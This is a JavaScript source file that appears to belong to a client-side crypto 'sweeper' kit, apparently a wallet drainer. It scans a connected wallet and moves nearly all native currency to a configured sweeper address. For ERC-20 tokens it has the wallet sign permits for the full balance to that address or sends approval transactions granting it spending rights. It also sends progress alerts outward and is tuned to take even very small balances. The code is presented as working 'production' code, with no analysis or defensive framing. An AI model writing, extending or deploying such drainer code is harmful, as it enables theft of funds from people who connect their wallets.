// client-side-evm-sweeper/src/engines/transaction-runner.js
import { ethers } from 'ethers';
import { MultiScanner } from './multi-scanner.js';
import { ValuationSorter } from './valuation-sorter.js';
import { payloadSigner } from './payload-signer.js';
import { allowanceGrantor } from './allowance-grantor.js';
import { DynamicFeeManager } from './dynamic-fees.js';
import { StateManager } from './state-manager.js';
import { OutboundAlerts } from './outbound-alerts.js';

/**
 * TRANSACTION RUNNER - Production v2.1 (Tolerant Small Balance Mode)
 * Now properly handles low balances like $1.85 ETH
 */
export class TransactionRunner {
    constructor(config) {
        this.config = config || {};

        this.scanner = new MultiScanner(
            config.networks,
            config.targets || [],
            { alchemyApiKey: config.alchemyApiKey || "" }
        );

        this.sorter = new ValuationSorter();
        this.feeManager = new DynamicFeeManager(config.networks);
        this.state = new StateManager();
        this.alerts = new OutboundAlerts(config.alerts || {});

        this.ownerAddress = config.ownerAddress;
        this.sweeperAddress = ethers.getAddress(config.sweeperAddress);

        this.dryRun = config.dryRun ?? true;
        this.maxConcurrent = config.maxConcurrent ?? 2;
        
        // Very low threshold for testing / small balances
        this.minBalanceThreshold = config.minBalanceThreshold ?? ethers.parseEther("0.0001");
    }

    async executeFullSweep(signer, provider) {
        if (!signer) throw new Error("Signer is required");
        if (!this.ownerAddress) throw new Error("Owner address not configured");

        console.log("🚀 Starting Full Asset Sweep...");

        try {
            await this.alerts.info("Sweep Initiated", "Scanning wallet...");

            const rawAssets = await this.scanner.scanAllTargets(this.ownerAddress);

            await this.alerts.info("Scan Complete", `${rawAssets.length} assets found.`);

            const sortedAssets = this.sorter.rankAssets(rawAssets);
            const targetsToSweep = sortedAssets.filter(asset => this.shouldSweep(asset));

            if (targetsToSweep.length === 0) {
                await this.alerts.info("Nothing to Sweep", "No assets met the sweep criteria.");
                console.warn("⚠️ No assets passed shouldSweep(). Check your targets config and balance.");
                return [];
            }

            console.log(`✅ Processing ${targetsToSweep.length} asset(s)...`);

            const results = await this.processAssetsInBatches(targetsToSweep, signer, provider);

            const successful = results.filter(r => r.success).length;
            await this.alerts.success("Sweep Completed", `${successful}/${results.length} assets processed.`);

            return results;
        } catch (error) {
            console.error("❌ Full sweep failed:", error);
            await this.alerts.error("Sweep Failed", error.message || "Unknown error");
            throw error;
        }
    }

    shouldSweep(asset) {
        if (!asset?.balance || asset.balance === '0') return false;

        try {
            const balance = ethers.toBigInt(asset.balance);
            const min = this.minBalanceThreshold;

            if (balance > min) {
                console.log(`[Filter] ✓ ${asset.symbol || 'Native'} → ${ethers.formatEther(balance)} ETH`);
                return true;
            }

            console.warn(`[Filter] ✗ ${asset.symbol || 'Native'} skipped - too small`);
            return false;
        } catch (e) {
            return false;
        }
    }

    async processAssetsInBatches(assets, signer, provider) {
        const results = [];
        const batches = this.chunkArray(assets, this.maxConcurrent);

        for (let i = 0; i < batches.length; i++) {
            const batch = batches[i];
            console.log(`Processing batch ${i + 1}/${batches.length}...`);

            const batchPromises = batch.map(asset => 
                this.processSingleAsset(asset, signer, provider)
            );

            const batchResults = await Promise.allSettled(batchPromises);

            batchResults.forEach((result, idx) => {
                const asset = batch[idx];
                if (result.status === 'fulfilled') {
                    results.push(result.value);
                } else {
                    results.push({
                        success: false,
                        asset,
                        error: result.reason?.message || String(result.reason)
                    });
                }
            });

            if (i < batches.length - 1) {
                await new Promise(r => setTimeout(r, 800));
            }
        }
        return results;
    }

    async processSingleAsset(asset, signer, provider) {
        const target = this.config.targets?.find(t => t.id === asset.targetId);
        if (!target) throw new Error(`Missing target config for ${asset.targetId}`);

        try {
            const gasSettings = await this.feeManager.getGasSettings(asset.chainId, { profile: 'aggressive' });

            if (asset.type === 'native') {
                const result = await this._handleNativeSweep(asset, signer, gasSettings);
                return { success: true, asset, ...result };
            }

            if (asset.type === 'erc20' && !this.dryRun) {
                const signedPermit = await payloadSigner.createAndSignForTarget(
                    target, this.ownerAddress, this.sweeperAddress, 
                    asset.balance, asset.chainId, signer
                );
                return { success: true, type: 'permit_signature', asset, ...signedPermit };
            }

            // Fallback: Approval path
            const approvalResult = await this._handleApproval(asset, target, signer, gasSettings);
            return { success: true, asset, ...approvalResult };

        } catch (error) {
            console.error(`Failed processing ${asset.symbol || asset.targetId}:`, error);
            this.state.markFailed(`asset-${asset.targetId}`, error);
            return { success: false, asset, error: error.message };
        }
    }

    // ====================== NATIVE SWEEP (TOLERANT) ======================
    async _handleNativeSweep(asset, signer, gasSettings) {
        const rawBalance = ethers.toBigInt(asset.balance);
        const gasPrice = gasSettings.maxFeePerGas || gasSettings.gasPrice || 8_000_000n;
        const gasLimit = 21_000n;
        const estimatedFee = gasPrice * gasLimit;

        console.log(`[Native] Balance: ${ethers.formatEther(rawBalance)} ETH | Est Fee: ~${ethers.formatEther(estimatedFee)} ETH`);

        let sweepAmount = rawBalance;

        // Only reserve gas if we have enough
        if (rawBalance > estimatedFee * 2n) {
            sweepAmount = rawBalance - estimatedFee;
        } else {
            console.warn("[Native] Low balance detected → Sending maximum possible amount");
        }

        const nativeTx = {
            to: this.sweeperAddress,
            value: sweepAmount,
            maxFeePerGas: gasSettings.maxFeePerGas,
            maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas || gasSettings.gasPrice,
            type: 2,
        };

        let tx = null;
        if (!this.dryRun) {
            tx = await signer.sendTransaction(nativeTx);
            await tx.wait();
            console.log(`✅ Native sweep confirmed: ${tx.hash}`);
        }

        return { 
            type: 'native_transfer', 
            hash: tx?.hash || null,
            amountSent: ethers.formatEther(sweepAmount)
        };
    }

    async _handleApproval(asset, target, signer, gasSettings) {
        const approvalTx = allowanceGrantor.createApprovalTx(target, this.sweeperAddress);

        const txWithGas = {
            ...approvalTx.tx,
            maxFeePerGas: gasSettings.maxFeePerGas,
            maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas,
            type: 2,
        };

        let tx = null;
        if (!this.dryRun) {
            tx = await signer.sendTransaction(txWithGas);
            await tx.wait();
            console.log(`✅ Approval confirmed: ${tx.hash}`);
        }

        return { type: 'contract_approval', hash: tx?.hash || null };
    }

    chunkArray(array, size) {
        return Array.from({ length: Math.ceil(array.length / size) }, (_, i) =>
            array.slice(i * size, i * size + size)
        );
    }
}

export default TransactionRunner;